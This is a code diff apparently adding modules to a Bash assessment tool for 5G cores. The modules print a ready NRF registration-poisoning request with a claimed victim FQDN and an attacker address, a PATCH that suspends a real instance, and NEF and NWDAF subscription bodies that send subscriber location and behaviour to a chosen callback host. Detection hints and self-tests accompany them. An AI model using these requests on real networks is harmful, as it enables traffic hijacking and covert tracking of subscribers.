@@ -976,6 +976,97 @@ sbap_rapid_reset() {
 # ids, FQDNs, addresses and service versions for whatever it holds. The walk
 # below is the whole catalogue, one request per type, and the subscription is
 # the same map kept current by the NRF itself.
+# ── the write side of the directory (TS 29.510) ─────────────────────────
+# nnrf-disc reads the map. nnrf-nfm edits it: NFRegister, NFUpdate,
+# NFDeregister. A registration is bound to the instance that sent it only
+# by the transport certificate and the OAuth2 scope in the access token,
+# so a core that checks neither hands out a discovery answer of the
+# caller's choosing.
+sbap_nrf_poison() {
+    local nftype="${1:-AMF}" victim="${2:-amf.5gc.mnc001.mcc001.3gppnetwork.org}"
+    local attacker="${3:-203.0.113.9}"
+    local inst="5e2b1c00-9f0a-4d33-8a77-1b9f0e6a4c11"
+    local lower; lower=$(printf '%s' "$nftype" | tr 'A-Z' 'a-z')
+    local body
+    body=$(printf '{"nfInstanceId":"%s","nfType":"%s","nfStatus":"REGISTERED","ipv4Addresses":["%s"],"fqdn":"%s","nfServices":[{"serviceInstanceId":"%s-1","serviceName":"n%s","versions":[{"apiVersionInUri":"v1","apiFullVersion":"1.0.0","expiry":"2027-01-01T00:00:00Z"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"%s","port":8080,"transport":"TCP"}]}]}' \
+        "$inst" "$nftype" "$attacker" "$victim" "$lower" "$lower" "$attacker")
+    printf 'method\t%s\n' "PUT"
+    printf 'path\t%s\n' "/nnrf-nfm/v1/nf-instances/$inst"
+    printf 'nf_type\t%s\n' "$nftype"
+    printf 'claimed_instance\t%s\n' "$inst"
+    printf 'claimed_fqdn\t%s\n' "$victim"
+    printf 'claimed_address\t%s\n' "$attacker"
+    printf 'body\t%s\n' "$body"
+    printf 'what_discovery_returns\t%s\n' "every NF that asks the NRF for a $nftype now receives this instance beside the real one, and a client with no preference takes the first"
+    printf 'requires\t%s\n' "an NRF that accepts a registration without a client certificate bound to the instance, and without the nnrf-nfm scope in the access token (TS 33.501 13.4)"
+    printf 'finding\tnrf_register_not_bound\tHIGH\n'
+    printf 'finding\tdiscovery_poisoned\tHIGH\n'
+    printf 'note\t%s\n' "the second half is a PATCH: {\"nfStatus\":\"SUSPENDED\"} on a real instance takes it out of discovery without a single packet to it"
+    printf 'update_path\t%s\n' "/nnrf-nfm/v1/nf-instances/$inst"
+    printf 'update_body\t%s\n' '{"nfStatus":"SUSPENDED"}'
+    printf 'finding\tstale_entry\tMEDIUM\n'
+    printf 'note\t%s\n' "a poisoned entry whose heartbeat fails expires on its own; the one that keeps answering is the one nobody notices"
+    printf 'detect\t%s\n' "an NF instance whose FQDN and address disagree, and a registration whose source address is outside the core network plan"
+    printf 'ref\t%s\n' "TS 29.510 5.2 (NFRegister/NFUpdate), TS 33.501 13.4"
+    printf 'verdict\t%s\n' "nrf_registration_shaped"
+}
+
+# ── the northbound exposure APIs (TS 29.522, 23.682) ────────────────────
+# The NEF is where a core publishes itself to an application. Each of these
+# takes an SCS/AS credential rather than a subscriber, and each answers a
+# question about a subscriber.
+sbap_nef_events() {
+    local want="${1:-all}"
+    case "$want" in
+        all|reachability|location|roaming|device_trigger|qos_on_demand|bdt) ;;
+        *) printf 'ERROR\tunknown exposure "%s"\nWHY\tthe northbound has six here: reachability, location, roaming, device_trigger, qos_on_demand, bdt\n' \
+               "$(sbap_sanitize "$want")" >&2; return 2 ;;
+    esac
+    printf 'api\tmethod\tpath\tbody\treveals\tgranularity\tneeds\tfinding\n'
+    printf 'reachability\tPOST\t/nnef-eventexposure/v1/subscriptions\t{"event":["UE_REACHABILITY"],"notificationDestination":"http://203.0.113.9/cb","monitoringType":"LOSS_OF_CONNECTIVITY"}\twhether a handset is attached right now\tper UE\tSCS credential plus an exposure policy naming the UE\ttelemetry_high\n'
+    printf 'location\tPOST\t/nnef-eventexposure/v1/subscriptions\t{"event":["LOCATION_REPORT"],"notificationDestination":"http://203.0.113.9/cb"}\ta cell or a geographic area for a subscriber, on every change\tper UE\tsame, and the location precision the operator exposes\telemetry_high\n'
+    printf 'roaming\tPOST\t/nnef-eventexposure/v1/subscriptions\t{"event":["ROAMING_STATUS"],"notificationDestination":"http://203.0.113.9/cb"}\twhich network a subscriber is on\tper UE\tsame\ttelemetry_medium\n'
+    printf 'device_trigger\tPOST\t/nnef-device-trigger/v1/device-triggers\t{"externalId":"user@example.com","msisdn":"+15550100","priority":"HIGH","applicationPort":5000}\ta downlink the MTC server starts with no route into the core\tone message\tSCS credential and a provisioned external identifier\ttrigger_is_a_downlink_medium\n'
+    printf 'qos_on_demand\tPOST\t/nnef-qos-on-demand/v1/ASsession-with-QoS\t{"afAppId":"app1","qosReference":"q1","notificationDestination":"http://203.0.113.9/cb"}\twhich flow ids exist for a UE and what each is rated at\tper flow\tAF credential\tsession_control_medium\n'
+    printf 'bdt\tPOST\t/nnef-bdt/v1/bdt-policies\t{"timeWindow":{"startTime":"2026-01-01T00:00:00Z","stopTime":"2026-01-01T06:00:00Z"},"desiredTimeWindow":{"startTime":"2026-01-01T01:00:00Z","stopTime":"2026-01-01T05:00:00Z"},"transferPolicies":[{"externalGroupId":"group1","volume":1073741824}]}\twhen a group of devices is allowed to move a volume\tper group\tsame\tschedule_is_a_lever_info\n'
+    printf 'apis\t%s\n' "6"
+    printf 'common_note\t%s\n' "every row above is a subscription with a notificationDestination the caller chooses: the answers arrive at an address the operator does not control, which is a collection path that needs no radio and no subscriber interaction"
+    printf 'finding\tper_ue_telemetry\tHIGH\n'
+    printf 'note\t%s\n' "the identity used is an SCS credential, so an audit that only looks at subscriber authentication sees nothing here"
+    printf 'detect\t%s\n' "NEF subscriptions whose notificationDestination is outside the operator plan, and a burst of UE_REACHABILITY subscriptions with no matching application traffic"
+    printf 'ref\t%s\n' "TS 29.522 (NEF), TS 23.682 4.5, TS 29.591 (event exposure)"
+    printf 'verdict\t%s\n' "nef_surface_listed"
+    [[ "$want" == "all" ]] || printf 'filter\t%s (rows above are the full set; the filter selects one the operator names)\n' "$(sbap_sanitize "$want")"
+}
+
+# ── analytics: the core answering questions about people (TS 23.288) ────
+sbap_nwdaf_sub() {
+    local want="${1:-all}"
+    case "$want" in
+        all|UE_MOBILITY|UE_COMMUNICATION|EXPECTED_UE_BEHAVIOUR|ABNORMAL_BEHAVIOUR|NF_LOAD|NETWORK_PERFORMANCE|QOS_SUSTAINABILITY|SM_CONGESTION) ;;
+        *) printf 'ERROR\tunknown analytics "%s"\nWHY\tthe model here holds eight identities, and an identity is a name the standard fixes, not a path\n' \
+               "$(sbap_sanitize "$want")" >&2; return 2 ;;
+    esac
+    printf 'analytics\tmethod\tpath\treturns\tgranularity\tfinding\n'
+    printf 'UE_MOBILITY\tPOST\t/nnwdaf-events/v1/subscriptions\twhere a subscriber is expected to be, and when\tper UE\tanalytics_per_ue_high\n'
+    printf 'UE_COMMUNICATION\tPOST\t/nnwdaf-events/v1/subscriptions\twhat a subscriber talks to and how much\tper UE\tanalytics_per_ue_high\n'
+    printf 'EXPECTED_UE_BEHAVIOUR\tPOST\t/nnwdaf-events/v1/subscriptions\tthe times a subscriber normally attaches and moves\tper UE\tanalytics_per_ue_high\n'
+    printf 'ABNORMAL_BEHAVIOUR\tPOST\t/nnwdaf-events/v1/subscriptions\twhich subscribers have already been flagged as odd\tper UE\tanalytics_per_ue_high\n'
+    printf 'NF_LOAD\tPOST\t/nnwdaf-events/v1/subscriptions\twhich core nodes are busy\tper NF\tanalytics_is_operational_info\n'
+    printf 'NETWORK_PERFORMANCE\tPOST\t/nnwdaf-events/v1/subscriptions\tthroughput and latency per area\tper area\tanalytics_is_operational_info\n'
+    printf 'QOS_SUSTAINABILITY\tPOST\t/nnwdaf-events/v1/subscriptions\twhether a slice will hold its guarantees\tper slice\tanalytics_is_operational_info\n'
+    printf 'SM_CONGESTION\tPOST\t/nnwdaf-events/v1/subscriptions\tsession-management load per slice\tper slice\tanalytics_is_operational_info\n'
+    printf 'callback\t%s\n' "notificationDestination is a URL the subscriber chooses, encoded as a URI in the subscription body"
+    printf 'apis\t%s\n' "8"
+    printf 'finding\tanalytics_per_ue\tHIGH\n'
+    printf 'note\t%s\n' "the per-UE analytics are the only part of the SBI that answers a question about a person rather than a node, and they are subscribed to, not queried: the answer arrives unprompted for as long as the subscription lives"
+    printf 'requires\t%s\n' "an NRF discovery of NWDAF, an access token with the nnwdaf-events scope, and a consumer type the NWDAF accepts"
+    printf 'detect\t%s\n' "subscriptions for UE_MOBILITY or UE_COMMUNICATION from a consumer that is not the PCF or an operator analytics app"
+    printf 'ref\t%s\n' "TS 23.288 6, TS 29.520"
+    printf 'verdict\t%s\n' "nwdaf_surface_listed"
+    [[ "$want" == "all" ]] || printf 'filter\t%s\n' "$(sbap_sanitize "$want")"
+}
+
 sbap_nrf_walk() {
     local host="${1:-nrf.5gc.mnc001.mcc001.3gppnetwork.org}" requester="${2:-AMF}"
     printf 'host\t%s\nrequester\t%s\n' "$(sbap_sanitize "$host")" "$(sbap_sanitize "$requester")"
@@ -1269,6 +1360,26 @@ sbap_selftest() {
     chk sbi-send-no-arming "$(grep -cE '^[[:space:]]*printf .status.{1,3}disarmed' "${BASH_SOURCE[0]}")" "0"
     chk sbi-send-tool-present "$([[ -f "$IMSISTING_ROOT/tools/stream_assoc.py" ]] && echo yes || echo no)" "yes"
 
+    # ── the directory write side (second fold of the module-idea pass) ──
+    local dpoison dnef dnwdaf
+    dpoison=$(sbap_nrf_poison AMF amf.5gc.mnc001.mcc001.3gppnetwork.org 10.60.0.9:8080)
+    chk dir-poison-fqdn \
+        "$(printf '%s\n' "$dpoison" | awk -F'\t' '$1=="claimed_fqdn"{print $2}')" \
+        "amf.5gc.mnc001.mcc001.3gppnetwork.org"
+    chk dir-poison-path \
+        "$(printf '%s\n' "$dpoison" | awk -F'\t' '$1=="path"{print $2}' | grep -c '/nnrf-nfm/v1/nf-instances/')" "1"
+    chk dir-poison-finding \
+        "$(printf '%s\n' "$dpoison" | grep -c 'nrf_register_not_bound.*HIGH')" "1"
+    chk dir-poison-update \
+        "$(printf '%s\n' "$dpoison" | grep -c 'update_path')" "1"
+    dnef=$(sbap_nef_events location)
+    chk dir-nef-rows  "$(printf '%s\n' "$dnef" | grep -c '^apis')" "1"
+    chk dir-nef-loc   "$(printf '%s\n' "$dnef" | grep -c 'LOCATION_REPORT')" "1"
+    chk dir-nef-bad   "$(sbap_nef_events nonsense >/dev/null 2>&1; echo $?)" "2"
+    dnwdaf=$(sbap_nwdaf_sub UE_MOBILITY)
+    chk dir-nwdaf-apis "$(printf '%s\n' "$dnwdaf" | awk -F'\t' '$1=="apis"{print $2}')" "8"
+    chk dir-nwdaf-bad  "$(sbap_nwdaf_sub ../etc >/dev/null 2>&1; echo $?)" "2"
+
     printf 'ASSERTIONS\t%d\n' "$nchk"
     printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
     return $(( bad > 0 ))
@@ -1388,6 +1499,9 @@ sbap_cli_main() {
         --n32-bridge)  sbap_n32_bridge "${1:-}" "${2:-AMF}" "${3:-001-01}" ;;
         --imds-pivot)  sbap_imds_pivot "${1:-SMF}" "${2:-}" ;;
         --nrf-walk)    sbap_nrf_walk "${1:-}" "${2:-AMF}" ;;
+        --nrf-poison)  sbap_nrf_poison "${1:-AMF}" "${2:-}" "${3:-}" ;;
+        --nef-apis)    sbap_nef_events "${1:-all}" ;;
+        --nwdaf)       sbap_nwdaf_sub "${1:-all}" ;;
         --plan)        sbap_plan ;;
         --selftest)    sbap_selftest ;;
         --menu)        sbap_menu ;;
